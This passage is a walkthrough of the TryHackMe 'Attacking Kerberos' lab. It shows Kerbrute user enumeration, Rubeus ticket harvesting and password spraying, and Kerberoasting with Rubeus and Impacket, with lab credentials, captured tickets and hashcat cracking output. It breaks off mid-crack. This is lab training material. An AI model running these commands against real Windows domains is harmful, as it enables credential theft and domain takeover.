# Attacking Kerberos

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
Tags: Windows
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller
```

Room link: [https://tryhackme.com/room/attackingkerberos](https://tryhackme.com/room/attackingkerberos)

## Solution

### Task 1: Introduction

This room will cover all of the basics of attacking Kerberos the windows ticket-granting service; we'll cover the following:

- Initial enumeration using tools like Kerbrute and Rubeus
- Kerberoasting
- AS-REP Roasting with Rubeus and Impacket
- Golden/Silver Ticket Attacks
- Pass the Ticket
- Skeleton key attacks using mimikatz

This room will be related to very real-world applications and will most likely not help with any CTFs however it will give you great starting knowledge of how to escalate your privileges to a domain admin by attacking Kerberos and allow you to take over and control a network.

It is recommended to have knowledge of general post-exploitation, active directory basics, and windows command line to be successful with this room.

![Kerberos](Images/Kerberos.png)

#### What is Kerberos?

Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

#### Common Terminology

- **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
- **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
- **Authentication Service (AS)** - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
- **Ticket Granting Service (TGS)** - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
- **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- **KDC Long Term Secret Key (KDC LT Key)** - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- **Client Long Term Secret Key (Client LT Key)** - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- **Service Long Term Secret Key (Service LT Key)** - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
- **Session Key** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- **Privilege Attribute Certificate (PAC)** - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

#### AS-REQ w/ Pre-Authentication In Detail

The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

#### Ticket Granting Ticket Contents

In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

![Ticket Granting Ticket](Images/Ticket_Granting_Ticket.png)

#### Service Ticket Contents

To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

- Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
- User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

![Service Ticket](Images/Service_Ticket.png)

#### Kerberos Authentication Overview

![Kerberos Authentication Overview](Images/Kerberos_Authentication_Overview.png)

1. **AS-REQ** - The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
2. **AS-REP** - The Key Distribution Center verifies the client and sends back an encrypted TGT.
3. **TGS-REQ** - The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
4. **TGS-REP** - The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
5. **AP-REQ** - The client requests the service and sends the valid session key to prove the user has access.
6. **AP-REP** - The service grants access

#### Kerberos Tickets Overview

The main ticket you will receive is a ticket-granting ticket (TGT). These can come in various forms, such as a `.kirbi` for Rubeus and `.ccache` for Impacket. A ticket is typically base64 encoded and can be used for multiple attacks.

The ticket-granting ticket is only used to get service tickets from the KDC. When requesting a TGT from the KDC, the user will authenticate with their credentials to the KDC and request a ticket. The server will validate the credentials, create a TGT and encrypt it using the krbtgt key. The encrypted TGT and a session key will be sent to the user.

When the user needs to request a service ticket, they will send the TGT and the session key to the KDC, along with the service principal name (SPN) of the service they wish to access. The KDC will validate the TGT and session key. If they are correct, the KDC will grant the user a service ticket, which can be used to authenticate to the corresponding service.

#### Attack Privilege Requirements

|Type of Attack|Requirements|
|----|----|
|Kerbrute Enumeration|No domain access required|
|Pass the Ticket|Access as a user to the domain required|
|Kerberoasting|Access as any user required|
|AS-REP Roasting|Access as any user required|
|Golden Ticket|Full domain compromise (domain admin) required|
|Silver Ticket|Service hash required|
|Skeleton Key|Full domain compromise (domain admin) required|

---------------------------------------------------------------------------

To start this room deploy the machine and start the next section on enumeration w/ Kerbrute.

This Machine can take up to 10 minutes to boot and up to 5 minutes to SSH or RDP into the machine.

---------------------------------------------------------------------------

#### What does TGT stand for?

Answer: `Ticket Granting Ticket`

#### What does SPN stand for?

Answer: `Service Principal Name`

#### What does PAC stand for?

Answer: `Privilege Attribute Certificate`

#### What two services make up the KDC?

Answer: `AS, TGS`

---------------------------------------------------------------------------

### Task 2: Enumeration w/ Kerbrute

**Kerbrute** is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.

For more information on enumeration using Kerbrute check out the Attacktive Directory room by Sq00ky - [https://tryhackme.com/room/attacktivedirectory](https://tryhackme.com/room/attacktivedirectory)

You need to add the DNS domain name along with the machine IP to `/etc/hosts` inside of your attacker machine or these attacks will not work for you

`10.112.191.62  CONTROLLER.local`

#### Abusing Pre-Authentication Overview

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

![Kerberos 2](Images/Kerberos_2.jpg)

#### Kerbrute Installation

1. Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)
2. Rename `kerbrute_linux_amd64` to `kerbrute`
3. `chmod +x kerbrute` - make kerbrute executable

#### Enumerating Users w/ Kerbrute

Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.

1. cd into the directory that you put Kerbrute
2. Download the wordlist to enumerate with [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt)
3. `./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt` - This will brute force user accounts from a domain controller using a supplied wordlist

![Kerbrute Enumeration](Images/Kerbrute_Enumeration.png)

Now enumerate on your own and find the rest of the users and more importantly service accounts.

---------------------------------------------------------------------------

#### How many total users do we enumerate?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/refs/heads/master/User.txt
--2026-04-30 11:20:09--  https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/refs/heads/master/User.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 836 [text/plain]
Saving to: ‘User.txt’

User.txt                                              100%[=========================================================================================================================>]     836  --.-KB/s    in 0s      

2026-04-30 11:20:09 (36.7 MB/s) - ‘User.txt’ saved [836/836]

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt                                  

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/30/26 - Ronnie Flathers @ropnop

2026/04/30 11:20:17 >  Using KDC(s):
2026/04/30 11:20:17 >   CONTROLLER.local:88

2026/04/30 11:20:17 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2026/04/30 11:20:17 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2026/04/30 11:20:17 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2026/04/30 11:20:17 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2026/04/30 11:20:17 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2026/04/30 11:20:17 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2026/04/30 11:20:17 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2026/04/30 11:20:17 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2026/04/30 11:20:17 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2026/04/30 11:20:17 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2026/04/30 11:20:17 >  Done! Tested 100 usernames (10 valid) in 0.253 seconds
```

Answer: `10`

#### What is the SQL service account name?

Answer: `sqlservice`

#### What is the second "machine" account name?

Answer: `machine2`

#### What is the third "user" account name?

Answer: `user3`

---------------------------------------------------------------------------

### Task 3: Harvesting & Brute-Forcing Tickets w/ Rubeus

To start this task you will need to RDP or SSH into the machine your credentials are -

- Username: `Administrator`
- Password: `P@$$W0rd`
- Domain: `controller.local`

Your Machine IP is `10.112.191.62`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ export TARGET_IP=10.112.191.62 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ xfreerdp /v:$TARGET_IP /cert:ignore /u:'Administrator' /p:'P@$$W0rd' /d:controller.local /h:1024 /w:1500 +clipboard                                                      
[11:26:30:716] [100231:100232] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[11:26:30:716] [100231:100232] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[11:26:30:906] [100231:100232] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[11:26:30:906] [100231:100232] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[11:26:34:429] [100231:100232] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
<---snip--->
```

Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

Rubeus is already compiled and on the target machine.

![Kerberos 3](Images/Kerberos_3.png)

#### Harvesting Tickets w/ Rubeus

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

1. `cd Downloads` - navigate to the directory Rubeus is in

2. `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds

![Rubeus Ticket Harvesting](Images/Rubeus_Ticket_Harvesting.png)

#### Brute-Forcing / Password-Spraying w/ Rubeus

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as `Password1` and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a `.kirbi` ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command:

`echo 10.112.191.62 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

1. `cd Downloads` - navigate to the directory Rubeus is in

2. `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

![Rubeus Password Spray](Images/Rubeus_Password_Spray.png)

Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.

---------------------------------------------------------------------------

#### Which domain admin do we get a ticket for when harvesting tickets?

```bat
C:\Users\Administrator> cd Downloads

C:\Users\Administrator\Downloads> Rubeus.exe harvest /interval:30

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Harvesting (with auto-renewal)
[*] Monitoring every 30 seconds for new TGTs
[*] Displaying the working TGT cache every 30 seconds


[*] Refreshing TGT ticket cache (4/30/2026 2:32:54 AM)

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  4/30/2026 1:46:56 AM
  EndTime               :  4/30/2026 11:46:56 AM
  RenewTill             :  5/7/2026 1:46:56 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEkUXxjqZSAjmgXnBNFejOIx3PcK/R2fZwuUr
    +SEd3tHkJYi49hpDL3TW9CJhSRhFH837VpFK1YiWpgEijojhC6NLjTm6CJYs1+6HiAyR66sIpjGOrcwhbXxZOs6ZUXaNUKqIuEzU
    H5XC5OJ9gVPCToOsFs7Ph6P1RGb6ajW9JIIq+PvCJg7aza7sh9/uRmRJCPXV1OhgDNI36ZoGAWJqPNxz5sE37ALKiM7ZdyC435OO
    YGcsRXiB6mqJtPHFHUD9cb7w3aE3zGkkG1uDPkU/i44kkhPemIbcmC6XVDl4v5MtLDTZ6/+B/VX3EFlO1ZRB2MzHvTMnN7x9T8IJ
    HgFCR+vbX2I1WiHwA72/y9sCOf+OT65ITpUh5HSH1AGZkWA04Qr3SODiwfZPFf9xBwlIeW6PLXVvY7S7udd8m7i1c6gYXuaQrsLq
    +ApMCRP31lB7LqrKFeuwiErDonrE8c2aKUm3Nn58T2nQZjV6JY2aBRljIrlOOb/GnTbTuprs2sQFAbgVFaqAmnPuknR6aBZPEuU7
    956UnKcJGmoBThTiMKXfBhZcPzJ1MRj6RPoxMhxdlAPql1sdgvRNcVeQZKanV93L7Mg4xTtKDJTInRiu0NZext50/sEUlNZlWKtl
    PSSjk8GRiKDScJZ79sIkIMKrWhxH3fZM12RGs1CmTrS9e2qB1K4vOrvjhuQYZOAn33fUBFfC9lBRd5yo+9LD03YNMEUjcBqxqOKD
    wvYQvDqo8w3YySR2tB46FF/EyLGFSIJrxZsajkZGcS3K9bAYvUDhnHgpOGX6XbmtoutkV+9AC/Mv+hPXxba92rEYs0TCLCm8blmz
    tkFdSaIxulp+4YJrcLJ3kkadZvzACtLmWrKWuYInFvccW621afncc7yhO3mkY4TtxKFoIFXqUIK/xhUd5JcO5DDcP68mQ/1cfh8C
    EB3znWSCUySlU2EOMnkE9kjurWPtkdmcG8HX4grr9BennrytDbQzemavcQL5bXcckesPkG6eJbU/7unVaMV+Aa9jUekoKN3c3Zs4
    sbWI90uMZ/7u1f8LRh/61xTVvz+WshccIq13BplborEO2XmVeNZzgox6hfi3NydMUpfMQaig2fqzVZgUcRt2GL2cZMRFNqUJhnRh
    slAraYPhWKiWZRt/hUTurf7PZp/nHLO/a8RSce6q7SP95Kz1RvHFhZEti9kG999GQxZ0RjodFBybrxrKviGRjrN+sZAs6tv8CEKJ
    YzyJVNK09XJ+zWIpV3QTfNt+OOPgETm867BTee/XP/7Pl0TmU8GI9SDhtxxh1LTXajjms1xbcXSOOhhiFqmpHiLEe8BxoIK25Gd+
    4d6rU0y+1tLwZPQ7GVK3ADVrsS2uEoejvIiWFrwhmKZwpiQiLxSEXZ6jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCDIhF1EvL6UZ27h886R4HK1IFzCmAKNHWRrmJdvYytUsqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDI2MDQzMDA4NDY1NlqmERgPMjAyNjA0MzAxODQ2NTZapxEYDzIwMjYwNTA3
    MDg0NjU2WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

<---snip--->

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  4/30/2026 2:26:33 AM
  EndTime               :  4/30/2026 12:26:33 PM
  RenewTill             :  5/7/2026 2:26:33 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGmdRCbF/oIIFTTNFI41JoiGp0hpZ3d3xj42S
    WXLQceOEyr/JYB+2OdNt+Xwor4mNz4TG3OooAW3zDBoUHoyROCw32U5A6SJscE+koSOGgltGKfzF6By6+10KbNuFTEGZsHS1Cflq
    6Lm3y2ymi9qTVny8q+i5LIdLCo2MXkLLwu3wQ2CT8jEMMR+8Rl28qDtqAzfT60PISVRAVuNzuTtvpeZTcotYuQCnU/KmedsulpoU
    PI3DFvXoOogvlzMe50XXjgokwoh6OzN0W+x3Y0xLQIUVmNlwCpR36bf6Xg8Fd2/P+tP8+sC5m6LOESl0cIzDfONrh4qBcOKDrAEx
    JWHlvzsw/c2NoDg9/QEGQ8TBktFeRDJKaOJK2Y3qLbDEgwFJLUKMVyn9Q/MHbVItDiOz0r2bd9iwaGzAx6CGmsk6IzYxfu+pCEt0
    Mzo8/viAp3zjfH6yhHz1aSgWMwfbJf/CpyIKBRzSZewJsAgRy0aq4ESwm3B/L9EAUBlLvBVcio2Ln62Kt/N9mdjYtvbGMOuafRqe
    2aoTqt2O87xK4sBnooNWp/4fN5Nq0E9J0zYJX3O3DEymw8aHR32/Wo4KvnGYxR6F/wVdOmNYYsGVbBow4BOhxSS665hri5VGE61e
    j2FopJQqjui/l18d+dK5DjXJeuprGI9qQDlWHt8NxweEmRi7EA58F10PZGjIr9d6l5JSlHv8MnZjrWc3xvyNIVf0IwAS8UkQd3Ci
    CF2jzz0mo8wJhBmBaWn28rI/4CQyS22FYXeUR5LjJL8YDjdmLwjiIAXT1a8en5E9ygyu0QBCWE4CogFvxqKKloBuS7hTRR7ITeVE
    VjcgLMG4eQ2+kXpwDnjERraZ/aE784QXl+NzhcmMKGykz89Glzjrq9atUXedKBH6ONGuyUIjI89wUm+CNBjlaSH9auigwo9wiYJN
    OCVX3oDR+Kje1bK574XU/XeTLnpvlVAK6eHjik4Zqh1OiVAYj+BJMPqf9K6fFIvpSte4UqcE+zIsuWZSdtbsEcaVgQHzrXd76qfv
    TPzHZimTArOFAcEYsO35qlnXKIbv8GZCt9fAO9wU96zQPNU+cvyIUseGXH4Uxao2ZW+rUWKZSD5iCWzIknw0F479lFwhDGPY7/4q
    pOqVgbvp4ePCWXPsKdLd1TbOXG3QQpIfw3e3yM76ayU0o83WYkNoJyXCWmOX7sDqG5oig7fHohqmCTfJycFry/fRPNoH6YxbRtLM
    1O8XSupGTt9Wcu49eiOe5vqM6WX3RNXdhd/tpWPFP2ivdFn/jo/+Wa8QjRxkfrW3MqfQXU9TBlwFful7BQFG93+81GY/Ar8bPJYW
    6tFc01u83oNhmicvOTUjzULN9fg+sWJ0bC0Tl4aiWZlxLnltJI/I6JuPaksKGtmxZ6OB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEILRFEgZE9w7dYZv8IzbfAgo70JWda1AzKERebL8ZQoucoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjYwNDMwMDkyNjMzWqYRGA8yMDI2MDQzMDE5MjYzM1qnERgP
    MjAyNjA1MDcwOTI2MzNaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=

[*] Ticket cache size: 4
[*] Sleeping until 4/30/2026 2:33:54 AM (30 seconds) for next display

^C
C:\Users\Administrator\Downloads>
```

Answer: `Administrator`

#### Which domain controller do we get a ticket for when harvesting tickets?

See output above.

Answer: `CONTROLLER-1`

---------------------------------------------------------------------------

### Task 4: Kerberoasting w/ Rubeus & Impacket

In this task we'll be covering one of the most popular Kerberos attacks - **Kerberoasting**. Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.

In order to perform the attack, we'll be using both Rubeus as well as Impacket so you understand the various tools out there for Kerberoasting. There are other tools out there such a kekeo and Invoke-Kerberoast but I'll leave you to do your own research on those tools.

I have already taken the time to put Rubeus on the machine for you, it is located in the downloads folder.

#### Method 1 - Kerberoasting w/ Rubeus

1. `cd Downloads` - navigate to the directory Rubeus is in

2. `Rubeus.exe kerberoast` This will dump the Kerberos hash of any kerberoastable users

![Rubeus Kerberoasting](Images/Rubeus_Kerberoasting.png)

copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat

```bat
C:\Users\Administrator\Downloads> Rubeus.exe kerberoast /outfile:kerb_hashes.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\Administrator\Downloads\kerb_hashes.txt


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\Administrator\Downloads\kerb_hashes.txt

[*] Roasted hashes written to : C:\Users\Administrator\Downloads\kerb_hashes.txt

C:\Users\Administrator\Downloads>
```

I have created a modified rockyou wordlist in order to speed up the process download it [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt)

3. `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash

#### Method 2 - Impacket

Impacket Installation

Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20

1. `cd /opt` navigate to your preferred directory to save tools in

2. download the precompiled package from [https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)

3. `cd Impacket-0.9.19` navigate to the impacket directory

4. `pip install .` - this will install all needed dependencies

Kerberoasting w/ Impacket

1. `cd /usr/share/doc/python3-impacket/examples/` - navigate to where **GetUserSPNs.py** is located

2. `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.112.191.62 -request` - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3. `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ export TARGET_IP=10.112.191.62

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ impacket-GetUserSPNs -dc-ip $TARGET_IP controller.local/Machine1:Password1 -request -outputfile kerb_hashes.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-26 00:28:26.922527  2020-05-26 00:46:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-26 00:39:17.578393  2020-05-26 00:40:14.671872             



[-] CCache file is not found. Skipping...
```

#### What Can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.

#### Kerberoasting Mitigation

- Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
- Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

---------------------------------------------------------------------------

#### What is the HTTPService Password?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ vi kerberoast_sql.txt

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ vi kerberoast_http.txt

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ hashcat -m 13100 kerberoast_http.txt Pass.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz, 2913/5890 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: Pass.txt
* Passwords.: 1240
* Bytes.....: 9706
* Keyspace..: 1240
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

